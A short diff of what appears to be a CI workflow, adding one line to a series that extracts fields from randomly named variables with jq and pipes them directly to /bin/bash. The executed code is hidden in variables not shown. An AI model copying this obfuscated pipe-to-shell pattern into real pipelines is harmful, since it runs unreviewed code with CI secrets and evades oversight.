@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$mqlfn7" | jq -r .hsr0003 | /bin/bash
           echo $qrr1 | jq -r .nbfex341 | /bin/bash
           echo $q78975 | jq -r .dckn65 | /bin/bash
+          printf '%s' "$imh36465" | jq -r .j57 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
